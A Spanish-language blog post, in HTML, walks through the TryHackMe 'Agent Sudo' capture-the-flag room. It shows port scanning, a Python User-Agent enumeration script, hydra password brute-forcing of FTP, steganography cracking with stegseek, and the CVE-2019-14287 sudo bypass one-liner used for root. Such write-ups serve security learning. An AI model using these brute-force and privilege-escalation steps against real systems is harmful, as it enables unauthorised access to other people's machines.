@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. ¡Que te diviertas!
+https://tryhackme.com/room/agentsudoctf
+IP Atacante = 10.10.10.10
+IP víctima = 10.10.92.221
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.10.92.221 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 127.'>
+<title>Resolución Agent sudo</title>
+
+<link rel='canonical' href='https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Resolución Agent sudo'>
+<meta property='og:description' content='Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. ¡Que te diviertas!
+https://tryhackme.com/room/agentsudoctf
+IP Atacante = 10.10.10.10
+IP víctima = 10.10.92.221
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.10.92.221 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 127.'>
+<meta property='og:url' content='https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/'>
+<meta property='og:site_name' content='d3b0o'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Fácil' /><meta property='article:tag' content='Linux' /><meta property='article:tag' content='Fuerza bruta' /><meta property='article:tag' content='CVE-2019-14287' /><meta property='article:tag' content='Archivos ocultos' /><meta property='article:published_time' content='2022-12-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-12-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/images/1.jpg' />
+<meta name="twitter:title" content="Resolución Agent sudo">
+<meta name="twitter:description" content="Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. ¡Que te diviertas!
+https://tryhackme.com/room/agentsudoctf
+IP Atacante = 10.10.10.10
+IP víctima = 10.10.92.221
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.10.92.221 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 127."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/images/1.jpg' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-WKTZJ16NWQ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-WKTZJ16NWQ', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/me_hu8ce9295535d46137a41121f9fb5616e1_5792_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">d3b0o</a></h1>
+            <h2 class="site-description">CTF Player</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Modo oscuro</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#reconocimiento">Reconocimiento</a>
+      <ol>
+        <li><a href="#escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</a></li>
+        <li><a href="#puerto-80">Puerto 80</a></li>
+      </ol>
+    </li>
+    <li><a href="#infiltración">Infiltración</a>
+      <ol>
+        <li><a href="#puerto-21">Puerto 21</a></li>
+        <li><a href="#cute-alienjpg">cute-alien.jpg</a>
+          <ol>
+            <li><a href="#messagetxt">message.txt</a></li>
+          </ol>
+        </li>
+        <li><a href="#puerto-22">Puerto 22</a></li>
+      </ol>
+    </li>
+    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/resoluci%C3%B3n-agent-sudo/">
+                <img src="/p/resoluci%C3%B3n-agent-sudo/images/1_hu3c4452d5be0aa5aa651a0e734140a323_382439_800x0_resize_q75_box.jpg"
+                        srcset="/p/resoluci%C3%B3n-agent-sudo/images/1_hu3c4452d5be0aa5aa651a0e734140a323_382439_800x0_resize_q75_box.jpg 800w, /p/resoluci%C3%B3n-agent-sudo/images/1_hu3c4452d5be0aa5aa651a0e734140a323_382439_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="365" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Agent sudo" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/thm/" style="background-color: #D65F41; color: #fff;">
+                THM
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/resoluci%C3%B3n-agent-sudo/">Resolución Agent sudo</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 15, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. ¡Que te diviertas!</p>
+<p><a class="link" href="https://tryhackme.com/room/agentsudoctf"  target="_blank" rel="noopener"
+    >https://tryhackme.com/room/agentsudoctf</a></p>
+<p>IP Atacante = 10.10.10.10</p>
+<p>IP víctima = 10.10.92.221</p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
+<pre><code>❯ ping -c 1 10.10.92.221
+PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data.
+64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms
+
+--- 10.10.92.221 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 127.854/127.854/127.854/0.000 ms
+</code></pre>
+<p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
+<h3 id="escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</h3>
+<p>Ahora empezamos con un escaneo de puertos</p>
+<pre><code>❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.92.221 -oG allPort
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-p-</td>
+<td>Para que el escaneo sea a todos los puertos (65536)</td>
+</tr>
+<tr>
+<td>&ndash;open</td>
+<td>Para que solo reporte los puertos abiertos</td>
+</tr>
+<tr>
+<td>-sS &ndash;min-rate 5000</td>
+<td>Definir el tiempo del escaneo</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>Omitir resolución DNS</td>
+</tr>
+<tr>
+<td>-vvv</td>
+<td>Para que vaya reportando lo que encuentre por consola</td>
+</tr>
+<tr>
+<td>-Pn</td>
+<td>Skip host discovery</td>
+</tr>
+<tr>
+<td>-oG allPorts</td>
+<td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td>
+</tr>
+</tbody>
+</table></div>
+<p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p>
+<p><a class="link" href="https://pastebin.com/tYpwpauW"  target="_blank" rel="noopener"
+    >Función extractPorts</a> de <a class="link" href="https://s4vitar.github.io"  target="_blank" rel="noopener"
+    >@s4vitar</a></p>
+<pre><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.92.221
+   5   │     [*] Open ports: 21,22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+<p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
+<pre><code>❯ nmap -p21,22,80 -sC -sV 10.10.92.221 -oN target
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef1f5d04d4779506d6072ecf058f2cc07 (RSA)
+|   256 5e02d19ac4e7430662c19e25848aed7ea (ECDSA)
+|_  256 2d005cdb9fda8c8d880e3924f8b4f18e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Annoucement
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-p21,22,80</td>
+<td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td>
+</tr>
+<tr>
+<td>-sC</td>
+<td>Para que realice scripts básicos de reconocimiento</td>
+</tr>
+<tr>
+<td>-sV</td>
+<td>Proporciona la versión e información de los servicios que corren por los puertos</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="puerto-80">Puerto 80</h3>
+<p>Hay una web con el siguiente texto en la página principal:</p>
+<hr>
+<p>Dear agents,</p>
+<p>Use your own codename as user-agent to access the site.</p>
+<p>From,
+Agent R</p>
+<hr>
+<p><em>Estimados agentes,</em></p>
+<p><em>Utilice su propio nombre en clave como agente de usuario para acceder al sitio.</em></p>
+<p><em>De,</em>
+<em>Agente R</em></p>
+<hr>
+<p>Según el texto podemos usar el &ldquo;nombre en clave&rdquo; como &ldquo;user agent&rdquo;. Vemos que está firmado como Agente R, se puede suponer que los agentes tienen una letra como nombre en clave. Con <code>curl -A &quot;A&quot; 10.10.92.221</code> podemos ver la web como Agente A, pero ir probando así hasta la z se puede hacer eterno, para eso e echo un script en python que atomatiza el proceso de las peticiones y guarda las repuestas distintas.</p>
+<p>User-Agent o también conocido como Agente de Usuario es una cabecera de texto que sirve para identificar al usuario que entra en una página web a través del navegador.</p>
+<pre><code class="language-python">from pwn import *
+import requests, signal, time, pbd, sys, string, os
+
+main_url = &quot;http://10.10.92.221&quot;
+characters = string.ascii_uppercase
+standard = requests.get(main_url)
+different = &quot;&quot;
+p1 = log.progress(&quot;Trying with Agent&quot;)
+p2 = log.progress(&quot;Agents with different response&quot;)
+
+for i in characters:
+    headers = {
+        'User-Agent': i
+    }
+
+    response = requests.get(main_url, headers=headers)
+    p1.status(i)
+    if response.text != standard.text:
+        different += &quot; {},&quot;.format(i) 
+        p2.status(different)
+        f = open ('agent_{}.txt'.format(i) ,'w')
+        f.write(response.text)
+        print(&quot;\n[*] Result saved on agent_{}.txt&quot;.format(i))
+        f.close()
+</code></pre>
+<p>Al ejecutarlo encuentra respuestas distintas con el Agente C y el Agente R</p>
+<pre><code class="language-bash">❯ python3 script.py
+[*] Trying with Agent: Z
+[*] Agents with different response:  C, R,
+
+[*] Result saved on agent_C.txt
+
+[*] Result saved on agent_R.txt
+</code></pre>
+<p>Dentro del agente_C.txt hay el siguiente mensaje</p>
+<hr>
+<p>Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!</p>
+<hr>
+<p><em>¿Todavía recuerdas nuestro trato? Por favor, dígale al agente J sobre las cosas lo antes posible. Además, cambia tu maldita contraseña, ¡es débil!</em></p>
+<hr>
+<p>Como dice que su contraseña es débil con hydra vamos a intentar encontrarla usando un diccionario.</p>
+<p>Hydra se considera el software para ciberseguridad estándar para ejecutar ataques de fuerza bruta en cuentas de servicios.</p>
+<pre><code>hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.92.221 -t 40
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th style="text-align:center">Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-l</td>
+<td>Usuario</td>
+</tr>
+<tr>
+<td style="text-align:center">-P</td>
+<td>Diccionario</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td>Velocidad</td>
+</tr>
+</tbody>
+</table></div>
+<h2 id="infiltración">Infiltración</h2>
+<h3 id="puerto-21">Puerto 21</h3>
+<p>El hydra encuentra la contraseña y ya podemos conectarnos por ftp como chris, dentro hay 3 archivos: To_agentJ.txt, cute-alien.jpg y cutie.png. Con <code>get archivo</code> nos los podemos pasar a nuestra máquina.</p>
+<p>Contenido de To_agentJ.txt</p>
+<hr>
+<p>Dear agent J,</p>
+<p>All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&rsquo;t be a problem for you.</p>
+<p>From,
+Agent C</p>
+<hr>
+<p><em>Estimado agente J,</em></p>
+<p><em>¡Todas estas fotos alienígenas son falsas! El Agente R almacenó la imagen real dentro de su directorio. Su contraseña de inicio de sesión se almacena de alguna manera en la imagen falsa. No debería ser un problema para ti.</em></p>
+<p><em>De,</em>
+<em>Agente C</em></p>
+<hr>
+<h3 id="cute-alienjpg">cute-alien.jpg</h3>
+<p>El Agente C dice que dentro de esta foto hay la contraseña de inicio de session del Agente J. Con steghide podemos intentar ver su contenido</p>
+<pre><code class="language-bash">❯ steghide extract -sf cute-alien.jpg
+Anotar salvoconducto: 
+steghide: �no pude extraer ning�n dato con ese salvoconducto!
+</code></pre>
+<p>No encuentra nada sin indicar salvoconducto. Para ello vamos a usar esta herramienta: <a class="link" href="https://github.com/RickdeJager/stegseek"  target="_blank" rel="noopener"
+    >https://github.com/RickdeJager/stegseek</a> para atraves de un diccionario poder conseguir el contenido oculto de la foto.</p>
+<pre><code>❯ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: &quot;Area51&quot;           
+[i] Original filename: &quot;message.txt&quot;.
+[i] Extracting to &quot;cute-alien.jpg.out&quot;.
+</code></pre>
+<h4 id="messagetxt">message.txt</h4>
+<p>Contenido del archivo message.txt renombrado a cute-alien.jpg.out</p>
+<hr>
+<p>Hi james,</p>
+<p>Glad you find this message. Your login password is censored!</p>
+<p>Don&rsquo;t ask me why the password look cheesy, ask agent R who set this password for you.</p>
+<p>Your buddy,
+chris</p>
+<hr>
+<p><em>Hola James,</em></p>
+<p><em>Me alegro de que encuentres este mensaje. ¡Su contraseña de inicio de sesión es censurado!</em></p>
+<p><em>No me pregunte por qué la contraseña parece cursi, pregúntele al agente R quién estableció esta contraseña para usted.</em></p>
+<p><em>Tu amigo,</em>
+<em>cris</em></p>
+<hr>
+<h3 id="puerto-22">Puerto 22</h3>
+<p>Ahora ya tenemos las credenciales de james y nos podemos conectar por ssh</p>
+<p>Ya podemos ver la flag de user.txt</p>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<p>con <code>sudo -l</code> podemos ver que puede ejecutar como root</p>
+<pre><code class="language-bash">james@agent-sudo:~$ sudo -l
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+</code></pre>
+<p>E buscado el <code>(ALL, !root) /bin/bash</code> en google y e encontrado que esto es porque el sudo tiene una versión menor a la 1.8.27 lo que lo hace vulnerable. Se puede confirmar con:</p>
+<pre><code class="language-bash">james@agent-sudo:~$ sudo --version
+Sudo version 1.8.21p2
+</code></pre>
+<p>En el exploit (<a class="link" href="https://www.exploit-db.com/exploits/47502"  target="_blank" rel="noopener"
+    >https://www.exploit-db.com/exploits/47502</a>) lo que pone es que podemos ejecutar cosas con sudo de la siguiente forma:</p>
+<p><code>sudo -u#-1 /bin/bash</code></p>
+<p>De echo ejecutando eso ya somos root y podemos ver la flag en el /root/root.txt</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+            <a href="/tags/f%C3%A1cil/">Fácil</a>
+        
+            <a href="/tags/linux/">Linux</a>
+        
+            <a href="/tags/fuerza-bruta/">Fuerza bruta</a>
+        
+            <a href="/tags/cve-2019-14287/">CVE-2019-14287</a>
+        
+            <a href="/tags/archivos-ocultos/">Archivos ocultos</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenidos relacionados</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-gallery/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-gallery/images/1.9cdf3669e2acf1e2b325f8d7c03bc858_hu74081d98836637a3a254577a6310e1ab_1919168_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Gallery"
+                        
+                        data-hash="md5-nN82aeKs8eKzJfjXwDvIWA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Gallery</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-ctf-mr.robot/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-ctf-mr.robot/images/1.6c74e5eac131228fdae2cbe1c551fd4f_hub8527424b32679a0bcc3a110c2f4945e_354448_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución CTF Mr.Robot"
+                        
+                        data-hash="md5-bHTl6sExIo/a4svhxVH9Tw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución CTF Mr.Robot</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-agent-t/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-agent-t/images/1.18faf70b1ffa54aa3aecc1174c6d9767_huf29766ebaf1cfce58d07e093ebeb54f2_381121_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Agent T"
+                        
+                        data-hash="md5-GPr3Cx/6VKo67MEXTG2XZw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Agent T</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-walkthrough-vulnversity/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-walkthrough-vulnversity/images/1.6d8dd25184c450b84269bbba10df64ea_hucee9ccf4868fd3f2cad3b857bd2e88b0_402407_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Walkthrough Vulnversity"
+                        
+                        data-hash="md5-bY3SUYTEULhCabu6EN9k6g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Walkthrough Vulnversity</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-brooklyn-nine-nine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-brooklyn-nine-nine/images/1.71d399d464577bd4375d995f79355b27_hu497414cf599898370e0688d21bfdaa35_422467_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Brooklyn Nine Nine"
+                        
+                        data-hash="md5-cdOZ1GRXe9Q3XZlfeTVbJw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Brooklyn Nine Nine</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "d3b0o" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 d3b0o
